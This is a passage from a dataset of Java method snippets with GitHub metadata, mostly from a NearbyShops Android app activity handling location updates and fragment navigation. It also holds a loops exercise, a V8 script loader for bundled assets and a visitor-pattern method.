locationResult.getLocations().get(locationResult.getLocations().size()-1);\n\n                lat = location.getLatitude();\n                lon = location.getLongitude();\n\n\n\n                PrefLocation.saveLatLonCurrent(lat,lon, HomeBackup1May20.this);\n\n                saveLocation(location);\n\n\n                stopLocationUpdates();\n\n//                showToastMessage(\"Location Updated !\");\n\n\n            }\n\n\n            @Override\n            public void onLocationAvailability(com.google.android.gms.location.LocationAvailability locationAvailability) {\n                super.onLocationAvailability(locationAvailability);\n            }\n        };\n\n\n\n\n\n\n        com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)\n                .getLastLocation()\n                .addOnFailureListener(new OnFailureListener() {\n                    @Override\n                    public void onFailure(@NonNull Exception e) {\n\n\n                        com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                                .requestLocationUpdates(mLocationRequestTwo,locationCallback, null);\n\n\n                    }\n                })\n                .addOnSuccessListener(new OnSuccessListener<Location>() {\n                    @Override\n                    public void onSuccess(Location location) {\n\n\n                        if(location==null)\n                        {\n\n                            com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                                    .requestLocationUpdates(mLocationRequestTwo,locationCallback, null);\n\n                            return;\n                        }\n\n                        saveLocation(location);\n                    }\n                });\n\n\n\n    }\n\n\n\n\n    void saveLocation(Location location)\n    {\n\n\n        Location currentLocation = PrefLocation.getLocation(this);\n\n\n//        showToast(\"Distance Change : \" + currentLocation.distanceTo(location));\n\n        if(currentLocation.distanceTo(location)>100)\n        {\n            // save location only if there is a significant change in location\n\n            PrefLocation.saveLatitude((float) location.getLatitude(), HomeBackup1May20.this);\n            PrefLocation.saveLongitude((float) location.getLongitude(), HomeBackup1May20.this);\n\n\n//        showToast(\"Home : Location Updated\");\n\n            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n            if (fragment instanceof LocationUpdated) {\n                ((LocationUpdated) fragment).locationUpdated();\n            }\n\n        }\n\n    }\n\n\n\n\n\n    protected void stopLocationUpdates() {\n\n        if(locationCallback!=null)\n        {\n            com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                    .removeLocationUpdates(locationCallback);\n        }\n    }\n\n\n}", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58066, "method_name": "showProfileFragment", "class_name": "HomeBackup1May20", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showProfileFragment(boolean refreshFragment) {\n\n        if (PrefGeneral.getMultiMarketMode(this)) {\n            // no market selected therefore show available markets in users area\n\n\n            if(refreshFragment)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commit();\n            }\n            else\n            {\n\n                if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n\n                    getSupportFragmentManager()\n                            .beginTransaction()\n                            .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                            .commit();\n                }\n            }\n\n\n        } else {\n            // single market mode\n\n            if (PrefLogin.getUser(getBaseContext()) == null) {\n\n\n                showLoginFragment();\n\n            }\n            else {\n\n\n\n                if(getSupportFragmentManager().findFragmentByTag(TAG_PROFILE)==null)\n                {\n                    getSupportFragmentManager()\n                            .beginTransaction()\n                            .replace(R.id.fragment_container, new ProfileFragment(), TAG_PROFILE)\n                            .commit();\n                }\n\n\n            }\n\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58067, "method_name": "showOrdersFragment", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showOrdersFragment() {\n\n\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commit();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n        } else if (PrefLogin.getUser(getBaseContext()) == null) {\n\n            showLoginFragment();\n\n        }\n        else {\n\n\n\n            if(getSupportFragmentManager().findFragmentByTag(TAG_ORDERS_FRAGMENT)==null)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, OrdersHistoryFragment.newInstance(true,false,false), TAG_ORDERS_FRAGMENT)\n                        .commitNow();\n\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58068, "method_name": "showCartFragment", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showCartFragment() {\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        } else if (PrefLogin.getUser(getBaseContext()) == null) {\n\n            showLoginFragment();\n            return;\n\n        }\n\n        else {\n\n\n            if(getSupportFragmentManager().findFragmentByTag(TAG_CARTS_FRAGMENT)==null)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new CartsListFragment(), TAG_CARTS_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new CartsListFragment(), TAG_CARTS_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58069, "method_name": "showShopsFragment", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showShopsFragment() {\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        } else {\n\n\n\n//            else\n//            {\n//                getSupportFragmentManager()\n//                        .beginTransaction()\n//                        .show(getSupportFragmentManager().findFragmentByTag(TAG_SHOPS_FRAGMENT));\n//            }\n\n\n\n\n\n\n\n//\n//\n//            if(!getSupportFragmentManager().popBackStackImmediate(\"shop_fragment\",0))\n//            {\n//                getSupportFragmentManager()\n//                        .beginTransaction()\n//                        .replace(R.id.fragment_container, FragmentShopNewBackup.newInstance(false), TAG_SHOPS_FRAGMENT)\n//                        .addToBackStack(\"shop_fragment\")\n//                        .commit();\n//            }\n\n\n\n//\n//            if(fragmentShop==null)\n//            {\n//                fragmentShop = FragmentShopNewBackup.newInstance(false);\n//            }\n\n\n\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_SHOPS_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new ItemsInShopByCatFragment(), TAG_SHOPS_FRAGMENT)\n                        .commitNow();\n\n//                FragmentShopsList.newInstance(false)\n            }\n\n\n\n\n//\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, FragmentShopsList.newInstance(false), TAG_SHOPS_FRAGMENT)\n//                    .addToBackStack(\"shop_fragment\")\n//                    .commit();\n\n\n\n        }\n\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58070, "method_name": "showItemsFragment", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showItemsFragment() {\n\n\n\n//        showToast(\"Show Items Triggered !\");\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n        }\n        else {\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_ITEMS_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new ItemsByCatFragment(), TAG_ITEMS_FRAGMENT)\n                        .commitNow();\n            }\n\n//            else {\n//                getSupportFragmentManager().popBackStack();\n//            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new ItemsByCatFragment(), TAG_ITEMS_FRAGMENT)\n//                    .addToBackStack(\"items\")\n//                    .commit();\n\n\n\n\n\n\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58071, "method_name": "initialFragmentSetup", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void initialFragmentSetup()\n    {\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                    .commitNow();\n\n\n        }\n        else {\n\n//            new ItemsDatabaseForAdminFragment()\n\n\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container, FragmentShopsList.newInstance(false), TAG_SHOPS_FRAGMENT)\n                    .commitNow();\n\n\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58072, "method_name": "showToastMessage", "class_name": "HomeBackup1May20", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showToastMessage(String message) {\n        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58073, "method_name": "onBackPressed", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {\n\n\n\n//        Fragment fragment = getSupportFragmentManager()\n//                .findFragmentByTag(TAG_ITEMS_FRAGMENT);\n//\n//\n//        if (fragment == null) {\n//            fragment = getSupportFragmentManager()\n//                    .findFragmentByTag(TAG_SHOPS_FRAGMENT);\n//        }\n\n\n        Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n\n        if (fragment instanceof NotifyBackPressed) {\n//            showLogMessage(\"Fragment Instanceof NotifyBackPressed !\");\n\n            if (((NotifyBackPressed) fragment).backPressed()) {\n                super.onBackPressed();\n            }\n        } else {\n            super.onBackPressed();\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58074, "method_name": "onCreateOptionsMenu", "class_name": "HomeBackup1May20", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCreateOptionsMenu(Menu menu) {\n        super.onCreateOptionsMenu(menu);\n        MenuInflater inflater = getMenuInflater();\n        inflater.inflate(R.menu.menu_items_by_cat_simple, menu);\n\n\n        // Associate searchable configuration with the SearchView\n        SearchView searchView = (SearchView) menu.findItem(R.id.action_search).getActionView();\n        SearchManager searchManager = (SearchManager) getSystemService(SEARCH_SERVICE);\n        searchView.setSearchableInfo(searchManager.getSearchableInfo(getComponentName()));\n\n\n        MenuItem item = menu.findItem(R.id.action_search);\n\n        item.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {\n            @Override\n            public boolean onMenuItemActionExpand(MenuItem item) {\n\n                return true;\n            }\n\n            @Override\n            public boolean onMenuItemActionCollapse(MenuItem item) {\n\n                Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n                if (fragment instanceof NotifySearch) {\n                    ((NotifySearch) fragment).endSearchMode();\n                }\n\n//                Toast.makeText(Home.this, \"onCollapsed Called \", Toast.LENGTH_SHORT).show();\n\n                return true;\n            }\n        });\n\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58075, "method_name": "showToast", "class_name": "HomeBackup1May20", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showToast(String message) {\n        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58076, "method_name": "onNewIntent", "class_name": "HomeBackup1May20", "params": ["Intent"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onNewIntent(Intent intent) {\n        super.onNewIntent(intent);\n\n        handleIntent(intent);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58077, "method_name": "handleIntent", "class_name": "HomeBackup1May20", "params": ["Intent"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleIntent(Intent intent) {\n\n        if (Intent.ACTION_SEARCH.equals(intent.getAction())) {\n            String query = intent.getStringExtra(SearchManager.QUERY);\n            //use the query to search your data somehow\n\n//            Toast.makeText(this,query,Toast.LENGTH_SHORT).show();\n\n\n            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n\n            if (fragment instanceof NotifySearch) {\n                ((NotifySearch) fragment).search(query);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58078, "method_name": "marketSelected", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void marketSelected() {\n\n//            bottomBar.selectTabWithId(R.id.tab_items);\n//            bottomBar.selectTabAtPosition(bottomBar.getCurrentTabPosition());\n//            showItemsFragment();\n\n\n//        showToastMessage(\"Market Selected : Home \");\n\n\n\n        getSupportFragmentManager().popBackStackImmediate(\n                null,\n                FragmentManager.POP_BACK_STACK_INCLUSIVE\n        );\n\n\n\n        int tabId = bottomBar.getSelectedItemId();\n\n\n        if (tabId == R.id.bottom_tab_items) {\n            showItemsFragment();\n        } else if (tabId == R.id.bottom_tab_shops) {\n\n            showShopsFragment();\n        } else if (tabId == R.id.bottom_tab_cart) {\n\n            showCartFragment();\n        } else if (tabId == R.id.bottom_tab_orders) {\n\n            showOrdersFragment();\n\n        } else if (tabId == R.id.bottom_tab_profile) {\n\n//                showProfileFragment();\n//                showItemsFragment();\n            bottomBar.setSelectedItemId(R.id.bottom_tab_shops);\n\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58079, "method_name": "onDestroy", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {\n        super.onDestroy();\n        stopLocationUpdates();\n\n        PrefLocation.setLocationSetByUser(false,this);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58080, "method_name": "fetchLocation", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void fetchLocation() {\n\n        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED\n                && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)\n        {\n            // TODO: Consider calling\n            //    ActivityCompat#requestPermissions\n            // here to request the missing permissions, and then overriding\n            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,\n            //                                          int[] grantResults)\n            // to handle the case where the user grants the permission. See the documentation\n            // for ActivityCompat#requestPermissions for more details.\n\n            showToastMessage(\"We cannot access Location ... Please grant permission for Location access !\");\n\n            return;\n        }\n\n\n\n\n        mLocationRequestTwo = LocationRequest.create();\n        mLocationRequestTwo.setInterval(1000);\n        mLocationRequestTwo.setSmallestDisplacement(10);\n        mLocationRequestTwo.setFastestInterval(1000);\n        mLocationRequestTwo.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);\n\n\n//        locationCallback = new MyLocationCallback();\n\n        locationCallback = new com.google.android.gms.location.LocationCallback(){\n            @Override\n            public void onLocationResult(com.google.android.gms.location.LocationResult locationResult) {\n                super.onLocationResult(locationResult);\n\n                if(HomeBackup1May20.this.isDestroyed())\n                {\n                    return;\n                }\n\n                double lat = 0;\n                double lon = 0;\n\n                Location location = locationResult.getLocations().get(locationResult.getLocations().size()-1);\n\n                lat = location.getLatitude();\n                lon = location.getLongitude();\n\n\n\n                PrefLocation.saveLatLonCurrent(lat,lon, HomeBackup1May20.this);\n\n                saveLocation(location);\n\n\n                stopLocationUpdates();\n\n//                showToastMessage(\"Location Updated !\");\n\n\n            }\n\n\n            @Override\n            public void onLocationAvailability(com.google.android.gms.location.LocationAvailability locationAvailability) {\n                super.onLocationAvailability(locationAvailability);\n            }\n        };\n\n\n\n\n\n\n        com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)\n                .getLastLocation()\n                .addOnFailureListener(new OnFailureListener() {\n                    @Override\n                    public void onFailure(@NonNull Exception e) {\n\n\n                        com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                                .requestLocationUpdates(mLocationRequestTwo,locationCallback, null);\n\n\n                    }\n                })\n                .addOnSuccessListener(new OnSuccessListener<Location>() {\n                    @Override\n                    public void onSuccess(Location location) {\n\n\n                        if(location==null)\n                        {\n\n                            com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                                    .requestLocationUpdates(mLocationRequestTwo,locationCallback, null);\n\n                            return;\n                        }\n\n                        saveLocation(location);\n                    }\n                });\n\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58081, "method_name": "saveLocation", "class_name": "HomeBackup1May20", "params": ["Location"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void saveLocation(Location location)\n    {\n\n\n        Location currentLocation = PrefLocation.getLocation(this);\n\n\n//        showToast(\"Distance Change : \" + currentLocation.distanceTo(location));\n\n        if(currentLocation.distanceTo(location)>100)\n        {\n            // save location only if there is a significant change in location\n\n            PrefLocation.saveLatitude((float) location.getLatitude(), HomeBackup1May20.this);\n            PrefLocation.saveLongitude((float) location.getLongitude(), HomeBackup1May20.this);\n\n\n//        showToast(\"Home : Location Updated\");\n\n            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n            if (fragment instanceof LocationUpdated) {\n                ((LocationUpdated) fragment).locationUpdated();\n            }\n\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58082, "method_name": "stopLocationUpdates", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void stopLocationUpdates() {\n\n        if(locationCallback!=null)\n        {\n            com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(HomeBackup1May20.this)\n                    .removeLocationUpdates(locationCallback);\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58083, "method_name": "main", "class_name": "RecapLoops", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t// while loops\n\t\t\n\t\tint count = 0;\n\t\twhile(count < 10) \n\t\t{\n\t\t\tSystem.out.print(count + \" \");\n\t\t\tcount++;\n\t\t}\n\t\t\n\t\tint count1 = 0;\n\t\tdo {\n\t\t\tSystem.out.println(count1);\n\t\t\tcount1++;\n\t\t}while(count1 < 10);\n\t\t\n\t\t\n\t\t// for loop\t\n\t\tfor(int i = 0, g = 3 ; i < 1000 || g < 4 ; i++, g++) \n\t\t{\n\t\t\tint num = 4;\n\t\t\tboolean b = false;\n\t\t\t\n\t\t\tcontinue;\n\t\t\t// some code \n\t\t}\n\t\t// System.out.println(num);\n\t\t\n\t\tfor(;;) \n\t\t{\n\t\t\tSystem.out.println(\"Hello!\");\n\t\t\tbreak;\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day15/RecapLoops.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58084, "method_name": "init", "class_name": "ScriptLoader", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void init(Context context) {\n        if (sInstance == null) {\n            synchronized (ScriptLoader.class) {\n                if (sInstance == null) {\n                    sInstance = new ScriptLoader(context);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/v8/ScriptLoader.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58085, "method_name": "loadByCoinCode", "class_name": "ScriptLoader", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "V8", "snippet": "    public V8 loadByCoinCode(String coinCode) {\n        V8 v8 = V8.createV8Runtime(\"window\");\n        String js = getJs(context, coinCode);\n        if (!TextUtils.isEmpty(js) && !v8.isReleased()) {\n            v8.executeVoidScript(js);\n        }\n        return v8;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/v8/ScriptLoader.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58086, "method_name": "loadByFileName", "class_name": "ScriptLoader", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "V8", "snippet": "    public V8 loadByFileName(String fileName) {\n        V8 v8 = V8.createV8Runtime(\"window\");\n        String js = readAsset(context.getAssets(),fileName);\n        if (!TextUtils.isEmpty(js) && !v8.isReleased()) {\n            v8.executeVoidScript(js);\n        }\n        return v8;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/v8/ScriptLoader.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58087, "method_name": "getJs", "class_name": "ScriptLoader", "params": ["Context", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getJs(Context context, String coinCode) {\n        AssetManager am = context.getAssets();\n        try {\n            JSONObject bundleMap = new JSONObject(readAsset(am, \"bundleMap.json\"));\n            return readAsset(am, \"script/\" + bundleMap.getString(coinCode));\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/v8/ScriptLoader.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58088, "method_name": "readAsset", "class_name": "ScriptLoader", "params": ["AssetManager", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String readAsset(AssetManager am, String fileName) {\n        StringBuilder stringBuilder = new StringBuilder();\n        try {\n            InputStream inputStream = am.open(fileName);\n            BufferedReader bf = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = bf.readLine()) != null) {\n                stringBuilder.append(line).append(\"\\r\\n\");\n            }\n            bf.close();\n            inputStream.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/v8/ScriptLoader.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58089, "method_name": "accept", "class_name": "MuseumObjectStructure", "params": ["Visitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accept(Visitor visitor) {\n        Iterator<Museum> i = lists.iterator();\n        while(i.hasNext()) {\n            ((Museum) i.next()).accept(visitor);\n        }\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": 